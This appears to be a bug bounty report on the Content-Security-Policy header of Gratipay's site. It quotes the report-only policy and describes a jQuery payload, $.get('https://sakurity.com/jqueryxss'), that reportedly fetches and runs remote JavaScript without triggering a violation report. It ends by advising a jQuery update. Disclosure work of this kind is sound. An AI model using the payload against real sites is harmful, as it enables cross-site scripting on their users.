## Vulnerability Information
Content Security Policy (CSP) is a computer security standard introduced to prevent cross-site scripting (XSS), clickjacking and other code injection attacks resulting from execution of malicious content in the trusted web page context. CSP provides a standard method for website owners to declare approved origins of content that browsers should be allowed to load on that website â€” covered types are JavaScript, CSS, HTML frames, web workers, fonts, images, embeddable objects such as Java applets, ActiveX, audio and video files, and other HTML5 features.

Content-Security-Policy-Report-Only: default-src 'self';script-src 'self' assets.gratipay.com 'unsafe-inline';style-src 'self' assets.gratipay.com downloads.gratipay.com cloud.typography.com;img-src *;font-src 'self' assets.gratipay.com cloud.typography.com data:;block-all-mixed-content;report-uri https://gratipay.report-uri.io/r/default/csp/reportOnly;


in that their is also a report-uri which sends a report on CSP Violation  as POST in case of CSP violation to 
https://gratipay.report-uri.io/r/default/csp/reportOnly;


I have a captured CSP post request in case of violation

I like to use $.get('https://sakurity.com/jqueryxss'); as input to show the CSP policy bypass

by using $.get('https://sakurity.com/jqueryxss'); I was able to bypass allowed CSP policy though https://sakurity.com is not allowed an approved origin of content, still I am able to fetch it and it didn't issue a POST request (report-uri attribute of CSP) which sends a report in case of any CSP violation ,


So using $.get request 
it didn't send a CSP report 
it read the remote content and executed the javascript





SOLUTION
Update your javascript libraries mainly jquery  elements to the latest version
